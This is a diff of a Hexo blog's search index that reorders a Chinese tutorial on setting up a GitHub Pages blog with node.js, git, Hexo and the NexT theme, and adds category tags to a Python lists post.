@@ -1,6 +1,87 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>github+hexo搭建个人博客教程</title>
+    <url>/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<h1 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h1><ul>
+<li>环境搭建<ul>
+<li>安装node.js</li>
+<li>安装git</li>
+<li>安装Hexo</li>
+</ul>
+</li>
+<li>github仓库的创建</li>
+<li>githubSSH的配置</li>
+<li>sublime的安装使用</li>
+<li>Hexo与github连接</li>
+<li>Hexo的主题切换</li>
+</ul>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><ul>
+<li>安装node.js之前请先安装npm并了解相关知识</li>
+</ul>
+<p>Hexo基于node.js,所以我们需要现在计算机中安装<a href="https://nodejs.org/zh-cn/download/">node.js</a>.<br><img src="https://img-blog.csdnimg.cn/20210111144246737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">选择windows64位安装包下载，下载完后一路next就好啦。</p>
+<p>检查node.js是否安装成功，win+r打开命令窗口，输入node -v<br><img src="https://img-blog.csdnimg.cn/20210112111604710.png" alt="node.js 检测"><br>出现版本号即安装成功</p>
+<p>检查npm是否安装成功，在命令窗口下，输入npm -v<br><img src="https://img-blog.csdnimg.cn/20210112111804857.png" alt="npm 检测"><br>出现版本号即安装成功</p>
+<p>好啦，到这里Hexo的环境已经搭建完毕了</p>
+<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><h3 id="1、git下载"><a href="#1、git下载" class="headerlink" title="1、git下载"></a>1、git下载</h3><p>git的下载可以去官网下载<a href="https://www.git-scm.com/download%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BC%9A%E6%9C%89%E7%82%B9%E6%85%A2%E3%80%82">https://www.git-scm.com/download，但是会有点慢。</a><br>觉得慢的可以去这个网址下载链接：<a href="https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw">https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw</a> 提取码：qivu </p>
+<h3 id="2、git安装"><a href="#2、git安装" class="headerlink" title="2、git安装"></a>2、git安装</h3><p>1、下载完后双击安装程序Git-2.30.0-64-bit，进入安装界面，点击next：<br><img src="https://img-blog.csdnimg.cn/2021011216423378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、选择安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112164344294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、安装配置窗口，包括git命令行、git图形界面等：<br><img src="https://img-blog.csdnimg.cn/20210112164432241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、选择开始菜单文件：<br><img src="https://img-blog.csdnimg.cn/20210112164543529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>5、选择git的默认编译器，推荐vim：<br><img src="https://img-blog.csdnimg.cn/20210112164710774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>6、选择仓库的初始名称，选默认就好了：<br><img src="https://img-blog.csdnimg.cn/20210112164917618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>7、选择可以用windows命令行操作，也可用git bash操作：<br><img src="https://img-blog.csdnimg.cn/20210112165043808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>8、HTTPS传输后台，用默认的就行了：<br><img src="https://img-blog.csdnimg.cn/20210112165228493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>9、选择换行符，默认unix格式，如果检测到windows格式则自动转换为unix格式：<br><img src="https://img-blog.csdnimg.cn/20210112165331786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>10、选择配置默认终端：<br><img src="https://img-blog.csdnimg.cn/20210112165500295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>11、选择git pull风格，推荐默认：<br><img src="https://img-blog.csdnimg.cn/20210112165533960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>12、选择凭据管理，推荐默认选项：<br><img src="https://img-blog.csdnimg.cn/20210112165642464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>13、配置额外的选项，选择文件缓存：<br><img src="https://img-blog.csdnimg.cn/20210112165731109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>14、这是新功能，不推荐选择：<br><img src="https://img-blog.csdnimg.cn/20210112165808234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>15、安装中：<br><img src="https://img-blog.csdnimg.cn/20210112165840223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>16、安装成功辣：<br><img src="https://img-blog.csdnimg.cn/20210112165902939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>17、在任意文件夹中，右键即可选择<br>Git GUI为git图形界面工具<br>Git Bash为命令行工具<br><img src="https://img-blog.csdnimg.cn/20210112170126809.png"></p>
+<h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><h3 id="Hexo安装-1"><a href="#Hexo安装-1" class="headerlink" title="Hexo安装"></a>Hexo安装</h3><p>hexo是我们以后用于搭建个人博客的框架，所以最好先新建一个blog文件夹用于博客的管理，且hexo框架与以后写作发布的网页都会保存在这个文件夹当中。<br>创建好之后，打开命令行，切换至创建的文件夹中：<br><img src="https://img-blog.csdnimg.cn/20210112171614641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>使用npm命令安装hexo，输入：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+<p>耐心等待安装完成，安装完成之后，先初始化我们的博客，输入：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init bolg</span><br></pre></td></tr></table></figure>
+<p>tips：这些命令必须在我们创建的文件夹中使用。</p>
+<p>此时我们检查一下我们网站的雏形，按顺序输入以下三条命令：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> hello Hexo		<span class="comment">//新建一篇名为“hello Hexo”的博客</span></span><br><span class="line">hexo g					<span class="comment">//生成静态文件</span></span><br><span class="line">hexo s					<span class="comment">//本地部署预览</span></span><br></pre></td></tr></table></figure>
+<p>到这里我们的网站已经初步成型了，可以输入localhost:4000进行访问。</p>
+<h3 id="Hexo的常用命令"><a href="#Hexo的常用命令" class="headerlink" title="Hexo的常用命令"></a>Hexo的常用命令</h3><h4 id="初始化命令"><a href="#初始化命令" class="headerlink" title="初始化命令"></a>初始化命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo -g	<span class="comment">//安装hexo</span></span><br><span class="line">npm update hexo -g	<span class="comment">//更新hexo</span></span><br><span class="line">hexo init	<span class="comment">//初始化博客</span></span><br></pre></td></tr></table></figure>
+<h4 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo n <span class="string">&quot;博客名称&quot;</span> = hexo <span class="keyword">new</span> <span class="string">&quot;博客名称&quot;</span>	<span class="comment">//新建一篇博客</span></span><br><span class="line">hexo g = hexo generate	<span class="comment">//生成</span></span><br><span class="line">hexo s = hexo server	<span class="comment">//启动服务器</span></span><br><span class="line">hexo d = hexo deploy	<span class="comment">//部署</span></span><br></pre></td></tr></table></figure>
+<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo server	<span class="comment">//hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s	<span class="comment">//静态模式</span></span><br><span class="line">hexo server -p <span class="number">5000</span>	<span class="comment">//更改端口</span></span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>	<span class="comment">//自定义 IP地址</span></span><br><span class="line">hexo clean	<span class="comment">//清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure>
+<h1 id="github仓库的创建"><a href="#github仓库的创建" class="headerlink" title="github仓库的创建"></a>github仓库的创建</h1><p>好了，到这里确保上方操作无误即可进行github仓库的创建(但首先你得先有个github账号哦)。<br>进入github主页，选择左上角的new：<br><img src="https://img-blog.csdnimg.cn/20210112173349599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>进入后输入仓库名称，必须要与owner下的名称一致，输入完后点击创建即可<br>我已经创建过仓库了，所以会提示<br><img src="https://img-blog.csdnimg.cn/20210112173512148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
+<p>进入git bash中，按顺序输入如下代码：</p>
+<blockquote>
+<p>git config –global user.email “<a href="mailto:&#120;&#x78;&#x78;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;">&#120;&#x78;&#x78;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;</a>“    //填写注册github的邮箱</p>
+</blockquote>
+<blockquote>
+<p>git config –global user.name “xxxx”    //github 用户名</p>
+</blockquote>
+<blockquote>
+<p>ssh-keygen    //输入完这个就一致enter就行了</p>
+</blockquote>
+<p>然后进入用户目录下的.ssh，打开id_rsa.pub，复制里面的内容。</p>
+<p>进入github，新建一个SSH就可以了：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210112180408871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="sublime的安装使用"><a href="#sublime的安装使用" class="headerlink" title="sublime的安装使用"></a>sublime的安装使用</h1><p>sublime是一个好用的文本编辑器。</p>
+<p>1、sublime下载<br>可以去官网下载：<a href="http://www.sublimetext.com/3">http://www.sublimetext.com/3</a><br>也可以云盘下载：<a href="https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw">https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw</a> 提取码：42pf </p>
+<p>2、选择一个除C盘外的安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112203141300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后点击next，安装完成：<br><img src="https://img-blog.csdnimg.cn/20210112203231376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、将博客目录拖入sublime：<br><img src="https://img-blog.csdnimg.cn/20210112210759495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Hexo与github连接"><a href="#Hexo与github连接" class="headerlink" title="Hexo与github连接"></a>Hexo与github连接</h1><p>1、在sublime中打开_config.yml，将Deployment改为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lucifer-rossweisse/lucifer-rossweisse.github.io.git	</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+<p>其中”repo”内填写github仓库中的SSH链接<br><img src="https://img-blog.csdnimg.cn/20210112211302998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、将”url”后改为”<a href="http://github项目名&quot;/">http://github项目名&quot;</a><br><img src="https://img-blog.csdnimg.cn/20210112211442895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、在命令行中输入下列代码，安装插件，上传博客</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git config --global user.email <span class="string">&quot;github邮箱&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;github用户名&quot;</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+<p>4、在浏览器中输入博客网址，也是github仓库名，即可查看(有时候需要等一会)<br><img src="https://img-blog.csdnimg.cn/20210112211855757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Hexo的主题切换"><a href="#Hexo的主题切换" class="headerlink" title="Hexo的主题切换"></a>Hexo的主题切换</h1><p>其实前面已经把重要的部分整完了，最后就换一个自己喜欢的主题就好了。</p>
+<p>主题可以从github上搜hexo-them进行查找，比较受欢迎的是next和yilia这两个主题，以next为主，之后主题的切换都可以这么来。</p>
+<p>1、进入博客文件夹，打开git bash，输入以下代码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
+<p>安装完后可以看到博客文件夹中的themes里出现了一个next文件夹，这就是我们下载的next主题。<br><img src="https://img-blog.csdnimg.cn/20210112212458400.png"><br>2、修改主题配置文件，进入博客文件夹中的_config.yml修改主题<br><img src="https://img-blog.csdnimg.cn/20210112212618350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后先在本地测试一下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210112212918907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<p>4、最后直接上传发布博客就好了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+<p>注意：hexo在5.0之后把swig给删除了，需要自己手动安装，不然安装next主题后会显示错误<br>输入下面这串代码安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
+<p>然后hexo c清理缓存，hexo g &amp; s即可。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>全部的搭建步骤已经讲完了，写篇博客其实只是为了记录一下自己学习的搭建过程，如果对你有帮助的话，可以分享给你的朋友哦(￣▽￣)”</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>next</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python列表的运用</title>
     <url>/2021/02/01/python%E5%88%97%E8%A1%A8%E7%9A%84%E8%BF%90%E7%94%A8/</url>
     <content><![CDATA[<h2 id="python列表的运用"><a href="#python列表的运用" class="headerlink" title="python列表的运用"></a>python列表的运用</h2><p>列表是python中内置的序列类型，与C语言中的数组有些类似，但实际上python中的列表更像是一种类，其中封装了许多种方法。</p>
@@ -95,85 +176,11 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.copy()</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20210201113614734.png"></p>
 ]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
       <tags>
         <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>github+hexo搭建个人博客教程</title>
-    <url>/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<h1 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h1><ul>
-<li>环境搭建<ul>
-<li>安装node.js</li>
-<li>安装git</li>
-<li>安装Hexo</li>
-</ul>
-</li>
-<li>github仓库的创建</li>
-<li>githubSSH的配置</li>
-<li>sublime的安装使用</li>
-<li>Hexo与github连接</li>
-<li>Hexo的主题切换</li>
-</ul>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><ul>
-<li>安装node.js之前请先安装npm并了解相关知识</li>
-</ul>
-<p>Hexo基于node.js,所以我们需要现在计算机中安装<a href="https://nodejs.org/zh-cn/download/">node.js</a>.<br><img src="https://img-blog.csdnimg.cn/20210111144246737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">选择windows64位安装包下载，下载完后一路next就好啦。</p>
-<p>检查node.js是否安装成功，win+r打开命令窗口，输入node -v<br><img src="https://img-blog.csdnimg.cn/20210112111604710.png" alt="node.js 检测"><br>出现版本号即安装成功</p>
-<p>检查npm是否安装成功，在命令窗口下，输入npm -v<br><img src="https://img-blog.csdnimg.cn/20210112111804857.png" alt="npm 检测"><br>出现版本号即安装成功</p>
-<p>好啦，到这里Hexo的环境已经搭建完毕了</p>
-<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><h3 id="1、git下载"><a href="#1、git下载" class="headerlink" title="1、git下载"></a>1、git下载</h3><p>git的下载可以去官网下载<a href="https://www.git-scm.com/download%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BC%9A%E6%9C%89%E7%82%B9%E6%85%A2%E3%80%82">https://www.git-scm.com/download，但是会有点慢。</a><br>觉得慢的可以去这个网址下载链接：<a href="https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw">https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw</a> 提取码：qivu </p>
-<h3 id="2、git安装"><a href="#2、git安装" class="headerlink" title="2、git安装"></a>2、git安装</h3><p>1、下载完后双击安装程序Git-2.30.0-64-bit，进入安装界面，点击next：<br><img src="https://img-blog.csdnimg.cn/2021011216423378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、选择安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112164344294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、安装配置窗口，包括git命令行、git图形界面等：<br><img src="https://img-blog.csdnimg.cn/20210112164432241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、选择开始菜单文件：<br><img src="https://img-blog.csdnimg.cn/20210112164543529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>5、选择git的默认编译器，推荐vim：<br><img src="https://img-blog.csdnimg.cn/20210112164710774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>6、选择仓库的初始名称，选默认就好了：<br><img src="https://img-blog.csdnimg.cn/20210112164917618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>7、选择可以用windows命令行操作，也可用git bash操作：<br><img src="https://img-blog.csdnimg.cn/20210112165043808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>8、HTTPS传输后台，用默认的就行了：<br><img src="https://img-blog.csdnimg.cn/20210112165228493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>9、选择换行符，默认unix格式，如果检测到windows格式则自动转换为unix格式：<br><img src="https://img-blog.csdnimg.cn/20210112165331786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>10、选择配置默认终端：<br><img src="https://img-blog.csdnimg.cn/20210112165500295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>11、选择git pull风格，推荐默认：<br><img src="https://img-blog.csdnimg.cn/20210112165533960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>12、选择凭据管理，推荐默认选项：<br><img src="https://img-blog.csdnimg.cn/20210112165642464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>13、配置额外的选项，选择文件缓存：<br><img src="https://img-blog.csdnimg.cn/20210112165731109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>14、这是新功能，不推荐选择：<br><img src="https://img-blog.csdnimg.cn/20210112165808234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>15、安装中：<br><img src="https://img-blog.csdnimg.cn/20210112165840223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>16、安装成功辣：<br><img src="https://img-blog.csdnimg.cn/20210112165902939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>17、在任意文件夹中，右键即可选择<br>Git GUI为git图形界面工具<br>Git Bash为命令行工具<br><img src="https://img-blog.csdnimg.cn/20210112170126809.png"></p>
-<h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><h3 id="Hexo安装-1"><a href="#Hexo安装-1" class="headerlink" title="Hexo安装"></a>Hexo安装</h3><p>hexo是我们以后用于搭建个人博客的框架，所以最好先新建一个blog文件夹用于博客的管理，且hexo框架与以后写作发布的网页都会保存在这个文件夹当中。<br>创建好之后，打开命令行，切换至创建的文件夹中：<br><img src="https://img-blog.csdnimg.cn/20210112171614641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>使用npm命令安装hexo，输入：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
-<p>耐心等待安装完成，安装完成之后，先初始化我们的博客，输入：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init bolg</span><br></pre></td></tr></table></figure>
-<p>tips：这些命令必须在我们创建的文件夹中使用。</p>
-<p>此时我们检查一下我们网站的雏形，按顺序输入以下三条命令：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> hello Hexo		<span class="comment">//新建一篇名为“hello Hexo”的博客</span></span><br><span class="line">hexo g					<span class="comment">//生成静态文件</span></span><br><span class="line">hexo s					<span class="comment">//本地部署预览</span></span><br></pre></td></tr></table></figure>
-<p>到这里我们的网站已经初步成型了，可以输入localhost:4000进行访问。</p>
-<h3 id="Hexo的常用命令"><a href="#Hexo的常用命令" class="headerlink" title="Hexo的常用命令"></a>Hexo的常用命令</h3><h4 id="初始化命令"><a href="#初始化命令" class="headerlink" title="初始化命令"></a>初始化命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo -g	<span class="comment">//安装hexo</span></span><br><span class="line">npm update hexo -g	<span class="comment">//更新hexo</span></span><br><span class="line">hexo init	<span class="comment">//初始化博客</span></span><br></pre></td></tr></table></figure>
